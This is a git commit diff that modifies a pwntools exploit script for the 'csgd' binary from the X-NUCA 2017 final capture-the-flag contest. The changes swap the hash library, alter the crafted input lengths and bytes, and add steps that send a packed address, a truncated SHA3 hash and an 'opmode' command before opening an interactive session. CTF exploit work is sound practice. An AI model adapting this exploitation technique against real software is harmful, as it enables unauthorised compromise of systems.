7e76641b50fdce6f04f730fc531c1a1e3daf0886
A1Lin <418912399@qq.com>
2022-10-21 11:43:36 +0800

    modify csgd2.py

--- x-nuca_2017_final/csgd2.py
+++ x-nuca_2017_final/csgd2.py
@@ -1,20 +1,26 @@
 from pwn import *
-import hashlib
-
+#import hashlib
+import sha3
 
 context.log_level = "debug"
-hash = hashlib.sha3_256(b"1234").digest()[0:3]
+hash = sha3.sha3_256(b"1234").digest()[0:3]
 p = process("./csgd")
 p.recvuntil(b"csgd's revenge\n")
 p.send(b"yy\n")
 p.send(b"yy\n")
 
-p.send(b"y\n")
+p.send(b"y~\n")
 p.recvuntil(b"what is the length of your message?\n")
-p.sendline(b"64")
+p.sendline(b"256")
 p.recvuntil(b"To ALL: ")
-raw_input()
+
 p.sendline(p64(0x6072C0))
 p.recvline()
 p.send(hash)
+p.recvuntil("# ")
+p.sendline(b"opmode\x00")
+p.recv()
+
+p.send(p32(4)+b"1234")
+
 p.interactive()
